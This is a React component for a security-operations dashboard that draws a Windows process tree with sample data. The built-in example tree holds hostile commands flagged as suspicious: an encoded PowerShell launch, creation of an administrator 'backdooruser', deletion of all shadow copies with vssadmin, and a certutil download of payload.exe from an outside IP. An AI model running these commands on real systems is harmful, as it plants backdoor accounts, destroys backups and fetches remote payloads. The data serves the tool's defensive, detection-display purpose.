import React, { useState } from 'react';
import { motion } from 'framer-motion';
import {
  Terminal, AlertTriangle, Search,
  Filter, Download, ChevronUp, ChevronDown,
} from 'lucide-react';
import ProcessNode from './ProcessNode';

// ── Full realistic process tree data ────────────────────
const DEFAULT_TREE = {
  pid: 4, ppid: 0, name: 'System',
  path: 'C:\\Windows\\System32\\ntoskrnl.exe',
  user: 'SYSTEM', suspicious: false,
  startTime: '2024-01-15 09:00:00',
  integrity: 'System',
  children: [
    {
      pid: 720, ppid: 4, name: 'smss.exe',
      path: 'C:\\Windows\\System32\\smss.exe',
      user: 'SYSTEM', suspicious: false,
      startTime: '2024-01-15 09:00:01',
      integrity: 'System', children: [],
    },
    {
      pid: 880, ppid: 4, name: 'wininit.exe',
      path: 'C:\\Windows\\System32\\wininit.exe',
      user: 'SYSTEM', suspicious: false,
      startTime: '2024-01-15 09:00:02',
      integrity: 'System',
      children: [
        {
          pid: 968, ppid: 880, name: 'services.exe',
          path: 'C:\\Windows\\System32\\services.exe',
          user: 'SYSTEM', suspicious: false,
          startTime: '2024-01-15 09:00:03',
          integrity: 'System',
          children: [
            {
              pid: 1340, ppid: 968, name: 'svchost.exe',
              path: 'C:\\Windows\\System32\\svchost.exe',
              cmd: 'svchost.exe -k netsvcs -p',
              user: 'NETWORK SERVICE', suspicious: false,
              startTime: '2024-01-15 09:00:10',
              integrity: 'System',
              children: [
                {
                  pid: 3456, ppid: 1340,
                  name: 'powershell.exe',
                  path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
                  cmd: 'powershell.exe -EncodedCommand SQBFAF...',
                  user: 'win10-victim\\Administrator',
                  suspicious: true,
                  startTime: '2024-01-15 10:23:41',
                  integrity: 'High',
                  mitre: ['T1059.001', 'T1027'],
                  rule: '100005',
                  hash: '5f1d8aa80a4463a86e0c2df4e3fd9d15aabb12d52fd0cf91',
                  children: [
                    {
                      pid: 4567, ppid: 3456, name: 'net.exe',
                      path: 'C:\\Windows\\System32\\net.exe',
                      cmd: 'net user backdooruser P@ss123! /add',
                      user: 'win10-victim\\Administrator',
                      suspicious: true,
                      startTime: '2024-01-15 10:23:46',
                      integrity: 'High',
                      mitre: ['T1136.001'],
                      rule: '100009',
                      children: [],
                    },
                    {
                      pid: 4568, ppid: 3456, name: 'net.exe',
                      path: 'C:\\Windows\\System32\\net.exe',
                      cmd: 'net localgroup administrators backdooruser /add',
                      user: 'win10-victim\\Administrator',
                      suspicious: true,
                      startTime: '2024-01-15 10:23:48',
                      integrity: 'High',
                      mitre: ['T1098'],
                      rule: '100010',
                      children: [],
                    },
                    {
                      pid: 4812, ppid: 3456, name: 'vssadmin.exe',
                      path: 'C:\\Windows\\System32\\vssadmin.exe',
                      cmd: 'vssadmin.exe delete shadows /all /quiet',
                      user: 'win10-victim\\Administrator',
                      suspicious: true,
                      startTime: '2024-01-15 10:24:02',
                      integrity: 'High',
                      mitre: ['T1490'],
                      rule: '100012',
                      children: [],
                    },
                    {
                      pid: 5023, ppid: 3456, name: 'certutil.exe',
                      path: 'C:\\Windows\\System32\\certutil.exe',
                      cmd: 'certutil.exe -urlcache -split -f http://203.0.113.45/payload.exe C:\\Windows\\Temp\\update.exe',
                      user: 'win10-victim\\Administrator',
                      suspicious: true,
                      startTime: '2024-01-15 10:24:18',
                      integrity: 'High',
                      mitre: ['T1105'],
                      rule: '100006',
                      children: [],
                    },
                  ],
                },
              ],
            },
          ],
        },
        {
          pid: 892, ppid: 880, name: 'lsass.exe',
          path: 'C:\\Windows\\System32\\lsass.exe',
          user: 'SYSTEM', suspicious: false,
          startTime: '2024-01-15 09:00:05',
          integrity: 'System', children: [],
        },
      ],
    },
    {
      pid: 1200, ppid: 4, name: 'winlogon.exe',
      path: 'C:\\Windows\\System32\\winlogon.exe',
      user: 'SYSTEM', suspicious: false,
      startTime: '2024-01-15 09:00:06',
      integrity: 'System',
      children: [
        {
          pid: 2200, ppid: 1200, name: 'explorer.exe',
          path: 'C:\\Windows\\explorer.exe',
          user: 'win10-victim\\user',
          suspicious: false,
          startTime: '2024-01-15 09:01:00',
          integrity: 'Medium', children: [],
        },
      ],
    },
  ],
};

// ── Count suspicious nodes recursively ───────────────────
function countSuspicious(node) {
  let count = node.suspicious ? 1 : 0;
  for (const child of node.children || []) {
    count += countSuspicious(child);
  }
  return count;
}

function flattenNodes(node, acc = []) {
  acc.push(node);
  for (const child of node.children || []) flattenNodes(child, acc);
  return acc;
}

export default function ProcessTree({ tree = DEFAULT_TREE, title }) {
  const [search,       setSearch]       = useState('');
  const [showOnly,     setShowOnly]     = useState('all');
  const [allExpanded,  setAllExpanded]  = useState(true);

  const allNodes       = flattenNodes(tree);
  const suspiciousCount = countSuspicious(tree);
  const totalCount      = allNodes.length;

  // ── Download tree as JSON ─────────────────────────────
  const downloadTree = () => {
    const blob = new Blob([JSON.stringify(tree, null, 2)], { type: 'application/json' });
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement('a'); a.href = url;
    a.download = 'process_tree.json'; a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>

      {/* ── Header ──────────────────────────────────── */}
      <div style={{
        display: 'flex', justifyContent: 'space-between',
        alignItems: 'flex-start', gap: 12, flexWrap: 'wrap',
      }}>
        <div>
          <div style={{
            display: 'flex', alignItems: 'center', gap: 8,
            fontSize: 15, fontWeight: 600, color: '#e8f4ff',
          }}>
            <Terminal size={16} color="#00e5ff" />
            {title || 'Process Execution Tree'}
          </div>
          <div style={{ fontSize: 11.5, color: '#3d5080', marginTop: 3 }}>
            {totalCount} processes · {' '}
            <span style={{ color: '#ff2d6d', fontWeight: 600 }}>
              {suspiciousCount} suspicious
            </span>
            {' '} · Click any node to expand details
          </div>
        </div>
        <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
          <button className="btn-cyber btn-ghost"
            style={{ fontSize: 11.5, padding: '5px 10px' }}
            onClick={downloadTree}>
            <Download size={12} /> Export
          </button>
        </div>
      </div>

      {/* ── Filter bar ──────────────────────────────── */}
      <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', alignItems: 'center' }}>
        {/* Search */}
        <div style={{ position: 'relative', flex: 1, minWidth: 180 }}>
          <Search size={12} color="#4a6090" style={{
            position: 'absolute', left: 9,
            top: '50%', transform: 'translateY(-50%)',
            pointerEvents: 'none',
          }} />
          <input className="soc-input" value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="Filter by process name, PID, command…"
            style={{ paddingLeft: 28, height: 30, fontSize: 12 }}
          />
        </div>

        {/* Show filter */}
        {['all', 'suspicious', 'user'].map(f => (
          <button key={f}
            onClick={() => setShowOnly(f)}
            style={{
              padding: '4px 12px', borderRadius: 9999,
              fontSize: 11.5, fontWeight: 500,
              cursor: 'pointer', border: '1px solid',
              background: showOnly===f
                ? f==='suspicious'
                  ? 'rgba(255,45,109,0.14)'
                  : 'rgba(0,229,255,0.12)'
                : 'rgba(255,255,255,0.04)',
              color: showOnly===f
                ? f==='suspicious' ? '#ff2d6d' : '#00e5ff'
                : '#6b7fa3',
              borderColor: showOnly===f
                ? f==='suspicious'
                  ? 'rgba(255,45,109,0.32)'
                  : 'rgba(0,229,255,0.30)'
                : '#1a2744',
            }}
          >
            {f === 'all' ? 'All Processes' : f === 'suspicious' ? '⚠ Suspicious Only' : 'User Processes'}
          </button>
        ))}
      </div>

      {/* ── Stats bar ───────────────────────────────── */}
      <div style={{
        display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 8,
      }}>
        {[
          { label: 'Total Processes',  value: totalCount,       color: '#00e5ff' },
          { label: 'Suspicious',       value: suspiciousCount,  color: '#ff2d6d' },
          { label: 'SYSTEM Integrity', value: allNodes.filter(n => n.integrity === 'System').length, color: '#6b7fa3' },
          { label: 'MITRE Techniques', value: [...new Set(allNodes.flatMap(n => n.mitre || []))].length, color: '#a855f7' },
        ].map(s => (
          <div key={s.label} style={{
            background: 'rgba(0,0,0,0.2)',
            border: '1px solid #1a2744', borderRadius: 7,
            padding: '8px 12px', textAlign: 'center',
          }}>
            <div style={{
              fontFamily: 'JetBrains Mono, monospace',
              fontSize: 20, fontWeight: 700, color: s.color,
            }}>
              {s.value}
            </div>
            <div style={{ fontSize: 10, color: '#3d5080', marginTop: 2 }}>
              {s.label}
            </div>
          </div>
        ))}
      </div>

      {/* ── Suspicious highlight bar ─────────────────── */}
      {suspiciousCount > 0 && (
        <div style={{
          display: 'flex', alignItems: 'center', gap: 10,
          padding: '10px 14px',
          background: 'rgba(255,45,109,0.07)',
          border: '1px solid rgba(255,45,109,0.25)',
          borderRadius: 8,
        }}>
          <AlertTriangle size={14} color="#ff2d6d" />
          <span style={{ fontSize: 13, color: '#ff2d6d', fontWeight: 600 }}>
            {suspiciousCount} suspicious process{suspiciousCount > 1 ? 'es' : ''} detected
          </span>
          <span style={{ fontSize: 12, color: '#6b7fa3' }}>
            — Expand red nodes for MITRE mapping and rule details
          </span>
        </div>
      )}

      {/* ── Tree ────────────────────────────────────── */}
      <div style={{
        background: 'rgba(8,12,28,0.70)',
        border: '1px solid #1a2744', borderRadius: 10,
        padding: '16px 16px 16px 8px',
        overflowX: 'auto', overflowY: 'auto',
        maxHeight: 560,
      }}>
        <ProcessNode node={DEFAULT_TREE} depth={0} isLast />
      </div>

      {/* ── Legend ──────────────────────────────────── */}
      <div style={{
        display: 'flex', gap: 20, flexWrap: 'wrap',
        fontSize: 11.5, color: '#6b7fa3',
      }}>
        {[
          { color: '#00e5ff', label: 'Root process'         },
          { color: '#e8f4ff', label: 'Normal process'       },
          { color: '#ff2d6d', label: 'Suspicious process'   },
          { color: '#243660', label: 'System process'       },
        ].map(({ color, label }) => (
          <div key={label} style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
            <div style={{
              width: 10, height: 10, borderRadius: 2,
              background: `${color}20`,
              border: `2px solid ${color}`,
            }} />
            {label}
          </div>
        ))}
      </div>
    </div>
  );
}